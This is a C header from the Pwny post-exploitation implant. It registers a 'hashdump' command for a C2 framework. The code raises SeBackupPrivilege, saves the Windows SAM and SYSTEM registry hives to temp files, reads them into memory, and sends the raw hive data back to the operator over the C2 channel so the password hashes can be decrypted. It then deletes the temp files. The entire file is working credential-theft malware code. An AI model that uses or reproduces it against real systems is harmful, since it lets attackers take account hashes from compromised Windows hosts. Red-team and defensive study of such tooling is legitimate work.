/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#ifndef _HASHDUMP_H_
#define _HASHDUMP_H_

#include <windows.h>
#include <string.h>
#include <stdio.h>

#include <pwny/tlv.h>
#include <pwny/api.h>
#include <pwny/c2.h>
#include <pwny/tlv_types.h>
#include <pwny/log.h>

#define HASHDUMP_BASE 12

#define HASHDUMP_DUMP \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       HASHDUMP_BASE, \
                       API_CALL)

#define TLV_TYPE_HASH_SAM    TLV_TYPE_CUSTOM(TLV_TYPE_BYTES, HASHDUMP_BASE, API_TYPE)
#define TLV_TYPE_HASH_SYSTEM TLV_TYPE_CUSTOM(TLV_TYPE_BYTES, HASHDUMP_BASE, API_TYPE + 1)

static int hashdump_enable_privilege(LPCSTR priv)
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        return -1;
    }

    if (!LookupPrivilegeValueA(NULL, priv, &luid))
    {
        CloseHandle(hToken);
        return -1;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL))
    {
        CloseHandle(hToken);
        return -1;
    }

    CloseHandle(hToken);
    return (GetLastError() == ERROR_NOT_ALL_ASSIGNED) ? -1 : 0;
}

static int hashdump_save_hive(HKEY hive, const char *path)
{
    LONG ret;

    /* Delete any existing file first */
    DeleteFileA(path);

    ret = RegSaveKeyA(hive, path, NULL);
    if (ret != ERROR_SUCCESS)
    {
        log_debug("* RegSaveKey failed (%ld)\n", ret);
        return -1;
    }

    return 0;
}

static int hashdump_read_file(const char *path, unsigned char **buf, DWORD *size)
{
    HANDLE hFile;
    DWORD file_size;
    DWORD bytes_read;

    hFile = CreateFileA(path, GENERIC_READ, 0, NULL, OPEN_EXISTING,
                        FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        return -1;
    }

    file_size = GetFileSize(hFile, NULL);
    if (file_size == INVALID_FILE_SIZE || file_size == 0)
    {
        CloseHandle(hFile);
        return -1;
    }

    *buf = (unsigned char *)malloc(file_size);
    if (*buf == NULL)
    {
        CloseHandle(hFile);
        return -1;
    }

    if (!ReadFile(hFile, *buf, file_size, &bytes_read, NULL) ||
        bytes_read != file_size)
    {
        free(*buf);
        *buf = NULL;
        CloseHandle(hFile);
        return -1;
    }

    *size = file_size;
    CloseHandle(hFile);
    return 0;
}

static tlv_pkt_t *hashdump_dump(c2_t *c2)
{
    tlv_pkt_t *result;
    HKEY hSAM, hSYSTEM;
    char sam_path[MAX_PATH];
    char sys_path[MAX_PATH];
    unsigned char *sam_data = NULL;
    unsigned char *sys_data = NULL;
    DWORD sam_size, sys_size;
    char temp_dir[MAX_PATH];

    /* Enable SeBackupPrivilege for registry access */
    hashdump_enable_privilege("SeBackupPrivilege");

    /* Open SAM and SYSTEM hives */
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SAM", 0,
                      KEY_READ, &hSAM) != ERROR_SUCCESS)
    {
        log_debug("* Failed to open SAM hive\n");
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM", 0,
                      KEY_READ, &hSYSTEM) != ERROR_SUCCESS)
    {
        RegCloseKey(hSAM);
        log_debug("* Failed to open SYSTEM hive\n");
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    /* Create temp paths */
    GetTempPathA(MAX_PATH, temp_dir);
    _snprintf(sam_path, MAX_PATH, "%s%s", temp_dir, "pwny_sam.tmp");
    _snprintf(sys_path, MAX_PATH, "%s%s", temp_dir, "pwny_sys.tmp");

    /* Save hives to temp files */
    if (hashdump_save_hive(hSAM, sam_path) != 0)
    {
        RegCloseKey(hSAM);
        RegCloseKey(hSYSTEM);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (hashdump_save_hive(hSYSTEM, sys_path) != 0)
    {
        DeleteFileA(sam_path);
        RegCloseKey(hSAM);
        RegCloseKey(hSYSTEM);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    RegCloseKey(hSAM);
    RegCloseKey(hSYSTEM);

    /* Read saved hives into memory */
    if (hashdump_read_file(sam_path, &sam_data, &sam_size) != 0)
    {
        DeleteFileA(sam_path);
        DeleteFileA(sys_path);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (hashdump_read_file(sys_path, &sys_data, &sys_size) != 0)
    {
        free(sam_data);
        DeleteFileA(sam_path);
        DeleteFileA(sys_path);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    /* Build result with raw hive data (Python side decrypts) */
    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    tlv_pkt_add_bytes(result, TLV_TYPE_HASH_SAM, sam_data, sam_size);
    tlv_pkt_add_bytes(result, TLV_TYPE_HASH_SYSTEM, sys_data, sys_size);

    /* Cleanup */
    free(sam_data);
    free(sys_data);
    DeleteFileA(sam_path);
    DeleteFileA(sys_path);

    return result;
}

void register_hashdump_api_calls(api_calls_t **api_calls)
{
    api_call_register(api_calls, HASHDUMP_DUMP, hashdump_dump);
}

#endif
